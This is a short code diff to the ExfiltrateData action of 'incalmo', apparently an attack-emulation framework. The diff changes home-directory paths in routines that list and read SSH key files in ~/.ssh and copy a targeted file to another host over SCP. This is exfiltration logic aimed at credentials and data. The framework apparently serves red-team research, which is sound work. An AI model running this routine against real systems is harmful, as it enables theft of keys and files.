@@ -2,6 +2,7 @@ import os
 from incalmo.models.agent import Agent
 
 from incalmo.core.actions.high_level_action import HighLevelAction
+from incalmo.core.actions.low_level_action import RESOLVE_HOME
 from incalmo.core.actions.LowLevel import (
     MD5SumAttackerData,
     ReadFile,
@@ -101,7 +102,7 @@ class ExfiltrateData(HighLevelAction):
     ) -> str | None:
         # Discover whatever .pub key exists rather than guessing the type
         list_events = await low_level_action_orchestrator.run_action(
-            ListFilesInDirectory(agent, "~/.ssh"), context
+            ListFilesInDirectory(agent, f"{RESOLVE_HOME}/.ssh"), context
         )
         pub_files = []
         for event in list_events:
@@ -111,7 +112,7 @@ class ExfiltrateData(HighLevelAction):
 
         for filename in pub_files:
             events = await low_level_action_orchestrator.run_action(
-                ReadFile(agent, f"~/.ssh/{filename}"), context
+                ReadFile(agent, f"{RESOLVE_HOME}/.ssh/{filename}"), context
             )
             for event in events:
                 if (
@@ -157,7 +158,7 @@ class ExfiltrateData(HighLevelAction):
                 ssh_port = str(ssh_port)
 
                 ssh_user = target_agent.username
-                filename = "~/" + os.path.basename(critical_filepath)
+                filename = f"{RESOLVE_HOME}/" + os.path.basename(critical_filepath)
 
                 await low_level_action_orchestrator.run_action(
                     SCPFile(
